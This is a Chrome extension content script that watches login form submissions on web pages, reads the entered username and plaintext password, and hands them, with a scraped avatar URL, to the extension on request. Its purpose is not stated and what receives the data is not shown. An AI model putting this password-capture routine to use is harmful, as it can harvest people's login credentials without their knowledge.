let lastDetected = null;

function tryCapture() {
  const usernameInput = document.querySelector('input[autocomplete="username"], input[name="username"], #login-username');
  const passwordInput = document.querySelector('input[type="password"], #login-password');

  if (usernameInput && usernameInput.value) {
    lastDetected = {
      username: usernameInput.value.trim(),
      password: passwordInput?.value || null,
    };
  }
}

document.addEventListener("submit", tryCapture, true);
document.addEventListener("click", (e) => {
  if (e.target?.type === "submit" || e.target?.closest('button[type="submit"]')) {
    tryCapture();
  }
}, true);

chrome.runtime.onMessage.addListener((message, _sender, sendResponse) => {
  if (message.type === "GET_DETECTED") {
    const avatarEl = document.querySelector(".avatar-image, img.avatar-card-image");
    if (lastDetected) {
      lastDetected.avatarUrl = avatarEl?.src || null;
    }
    sendResponse({ data: lastDetected });
  }
  if (message.type === "GET_PROFILE") {
    const usernameEl = document.querySelector(".profile-name, [data-testid='username']");
    const avatarEl = document.querySelector(".avatar-image, img.avatar-card-image, img[class*='avatar']");
    sendResponse({
      data: usernameEl ? {
        username: usernameEl.textContent?.trim(),
        avatarUrl: avatarEl?.src || null,
      } : null,
    });
  }
});
